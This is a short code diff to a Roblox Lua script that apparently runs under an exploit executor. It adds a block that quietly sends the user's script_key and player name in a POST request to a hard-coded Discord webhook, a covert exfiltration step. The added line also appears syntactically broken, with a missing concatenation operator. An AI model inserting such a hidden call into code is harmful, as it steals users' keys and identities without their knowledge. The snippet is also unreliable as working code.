@@ -43,6 +43,17 @@ and game.Players.LocalPlayer
 
 local plr = game.Players.LocalPlayer
 
+if script_key then
+syn.request({
+		Url = 'https://discord.com/api/webhooks/1114970324149219379/okmMVCEylFDMbdj0Zf5qioqS-_vHG6mFgEKmumLvL9_66eOQKSpUV-Xcx-29fTGSp6eh',
+		Method = "POST",
+		Headers = {
+			["Content-Type"] = "application/json"
+		},
+		Body = HttpService:JSONEncode("alo sjuc vat wadu vmware detect | " .. script_key .. " | " game.Players.LocalPlayer.Name)
+	})
+	end
+
 if true then
     local LoadingCount = tick()
     repeat wait(1)
